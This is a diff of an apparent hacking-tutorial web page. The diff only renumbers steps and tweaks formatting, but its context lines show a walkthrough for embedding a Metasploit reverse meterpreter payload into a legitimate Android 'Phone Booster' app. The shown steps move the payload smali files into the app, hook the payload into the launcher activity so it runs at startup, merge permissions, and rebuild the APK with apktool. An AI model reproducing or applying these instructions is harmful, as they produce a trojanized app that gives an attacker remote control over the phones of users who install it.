@@ -197,11 +197,11 @@ Hey what's up, welcome back to VulnX, in this tutorial we are going to learn how
         Now almost all traces are removed, now we must shift all these files in the proper directories using the following command :-
         <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/apk_embedding/rev_tcp_malicious/smali/com/metasploit/stage</font># mv * ~/apk_embedding/Phone\ Booster\ Official/smali/com/lite/omnicleaner/</div></pre>
         
-        <h1><u>STEP-3 : Finding the hook-point and injecting the hook</u></h1>
+        <h1><u>STEP-4 : Finding the hook-point and injecting the hook</u></h1>
 
         So basically, the app has the files required to give us a reverse meterpreter connection but those files aren't actually getting loaded. So we have to manually inject the hook to start the <b>Payload.smali</b> as soon as the app loads. So first we need to know which smali is loaded the first when the app loads, then we can add an extra line there to start our payload. So let's go to the "Phone Booster Official" folder and view the contents of the <b>'AndroidManifest.xml'</b>.<br>
         Now here we need to find the following lines :-
-        <em class="word-break"><ul><li>&lt;action android:name="android.intent.action.MAIN"/&gt;</li><br><li>&lt;category android:name="android.intent.category.LAUNCHER"/&gt;</em></li></ul>
+        <pre><div class="snip">&lt;action android:name="android.intent.action.MAIN"/&gt;</li><br><li>&lt;category android:name="android.intent.category.LAUNCHER"/&gt;</div></pre>
         
         The snippet given below shows a segment of the code where the above two lines are present :-
         <pre><div class="snip">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;activity</font> <font color="#55FF55">android:name</font>=<font color="#FF55FF">"com.lite.rammaster.module.splash.SplashActivity"</font><font color="#55FF55"> android:screenOrientation</font>=<font color="#FF55FF">"portrait"</font><font color="#55FFFF">&gt;</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;intent-filter&gt;</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF"><b>&lt;action</font> <font color="#55FF55">android:name</font>=<font color="#FF55FF">"android.intent.action.MAIN"</font><font color="#55FFFF">/&gt;</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;category</font> <font color="#55FF55">android:name</font>=<font color="#FF55FF">"android.intent.category.LAUNCHER"</font><font color="#55FFFF">/&gt;</font></b><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;/intent-filter&gt;</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;/activity&gt; </font></div></pre>
@@ -220,7 +220,7 @@ Hey what's up, welcome back to VulnX, in this tutorial we are going to learn how
 
         After that simply save the file and exit from vim. Now even the hook is inserted. Now we are just one step less than the final.
 
-        <h1><u>STEP-4 : Inserting necessary permissions</u></h1>
+        <h1><u>STEP-5 : Inserting necessary permissions</u></h1>
 
         This step is fairly simple. We have placed the smalis in the proper directory. We have also linked them with the program and injected the hook. Now the program can easily use all the smalis, just one step is remaining. The app right now only has those permissions which are necessary for the host app [ our custom downloaded apk ]. But there are/might be some permissions which are necessary for the MainActivity and are not currently provided in the permission list. So we need to copy all permissions from MainActivity's <b>'AndroidManifest.xml'</b> file and paste them in Phone Booster's  <b>'AndroidManifest.xml'</b> file. But wait wait! Hold on, the app would crash if any permission is duplicated. I had spent a lot of time when I encountered this issue. I spent hours trying to figure out what was going wrong. Is it an incompatible apk? My MainActivity is corrupt? Is there a issue with apktool? and many more. But then I realised that it's just the duplicated permissions. So be sure to NOT make that mistake and remove any duplicated permissions.<br><br>
 
@@ -236,7 +236,7 @@ Hey what's up, welcome back to VulnX, in this tutorial we are going to learn how
 
         Now finally we are at the end.
 
-        <h1><u>STEP-5 : Building [ or Recompiling ] the apk from the folder and signing it</u></h1>
+        <h1><u>STEP-6 : Building [ or Recompiling ] the apk from the folder and signing it</u></h1>
 
         Let's go in the apk_embedding directory and use the following command to build the apk back :-
         <pre><div class="snip">apktool b -f Phone\ Booster\ Official</div></pre>
